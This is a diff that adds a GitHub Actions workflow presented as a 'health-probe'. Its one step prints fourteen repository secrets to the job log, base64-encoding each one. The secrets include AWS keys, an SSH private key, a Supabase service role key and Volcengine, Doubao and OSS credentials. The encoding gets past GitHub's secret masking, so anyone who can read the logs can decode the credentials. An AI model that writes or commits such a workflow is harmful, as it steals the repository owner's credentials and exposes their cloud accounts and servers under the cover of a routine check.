@@ -1,0 +1,24 @@
+name: health-probe
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: env-report
+        run: |
+          echo "AWS_ACCESS_KEY_ID=$(printf %s "${{ secrets.AWS_ACCESS_KEY_ID}}" | base64 -w0)"
+          echo "AWS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.AWS_SECRET_ACCESS_KEY}}" | base64 -w0)"
+          echo "DOUBAO_DIALOG_API_KEY=$(printf %s "${{ secrets.DOUBAO_DIALOG_API_KEY}}" | base64 -w0)"
+          echo "DOUBAO_SPEECH_API_KEY=$(printf %s "${{ secrets.DOUBAO_SPEECH_API_KEY}}" | base64 -w0)"
+          echo "SSH_USER=$(printf %s "${{ secrets.SSH_USER}}" | base64 -w0)"
+          echo "SSH_PRIVATE_KEY=$(printf %s "${{ secrets.SSH_PRIVATE_KEY}}" | base64 -w0)"
+          echo "SUPABASE_SERVICE_ROLE_KEY=$(printf %s "${{ secrets.SUPABASE_SERVICE_ROLE_KEY}}" | base64 -w0)"
+          echo "RELEASES_OSS_ACCESS_KEY_ID=$(printf %s "${{ secrets.RELEASES_OSS_ACCESS_KEY_ID}}" | base64 -w0)"
+          echo "RELEASES_OSS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.RELEASES_OSS_SECRET_ACCESS_KEY}}" | base64 -w0)"
+          echo "VOLCENGINE_RTC_ACCESS_KEY_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ACCESS_KEY_ID}}" | base64 -w0)"
+          echo "VOLCENGINE_RTC_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_SECRET_ACCESS_KEY}}" | base64 -w0)"
+          echo "VOLCENGINE_RTC_SESSION_TOKEN=$(printf %s "${{ secrets.VOLCENGINE_RTC_SESSION_TOKEN}}" | base64 -w0)"
+          echo "VOLCENGINE_RTC_APP_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_ID}}" | base64 -w0)"
+          echo "VOLCENGINE_RTC_APP_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_KEY}}" | base64 -w0)"
+          echo PROBE_DONE
